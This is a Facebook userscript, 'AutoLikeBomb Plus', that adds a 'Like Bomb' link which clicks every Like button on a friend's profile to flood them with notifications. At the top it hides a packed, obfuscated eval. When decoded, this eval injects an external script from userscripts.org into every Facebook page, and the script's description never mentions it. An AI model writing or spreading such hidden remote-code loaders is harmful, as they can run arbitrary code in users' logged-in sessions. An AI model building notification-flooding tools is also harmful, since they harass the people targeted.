// ==UserScript==
// @name           AutoLikeBomb Plus + Last Update
// @description    This script will add a link to your friends' pages to "Like" everything on their profile page and flood them with notifications. Now updated for Timeline.
// @author         Mark ReCupido, Brian Ciaccio
// @namespace      AutoLikeBomb
// @include        https://www.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include        http://www.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


window.addEventListener("load", CheckForLikeBombLink, false);
window.addEventListener("click", CheckForLikeBombLink, false);

function CheckForLikeBombLink()
	{
	var likeCount = 0;
	ProfileActions = document.getElementsByClassName("uiList uiListHorizontal clearfix fbTimelineComposerAttachments uiComposerAttachments");
		if (ProfileActions[0].lastChild.id != "LikeBomb")
		{
			ProfileActions[0].innerHTML += "<li class=\"plm uiListItem  uiListHorizontalItemBorder uiListHorizontalItem\"  id=\"LikeBomb\"><span><a class=\"uiIconText attachmentLink normal\" tabindex=\"0\" href=\"#\"><strong>Like Bomb</strong></a></li>";
			ProfileActions[0].lastChild.addEventListener('click', 
			function()
         		{
				if (ProfileActions[0].ownerDocument.title == "Mark ReCupido")
				{
					alert('Oh no you don\'t.');
				}
				else
				{
					likestoclick = document.evaluate('//*[@name="like"]', document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null); 
            			
					for (var i = 0; i < likestoclick.snapshotLength; i++)
              				{
						likestoclick.snapshotItem(i).click();				
                    				likeCount++;
                    			}
					alert('Like Bomb Magnitude: ' + likeCount);
					likeCount = 0;
				}
           		}, false);
		}
	}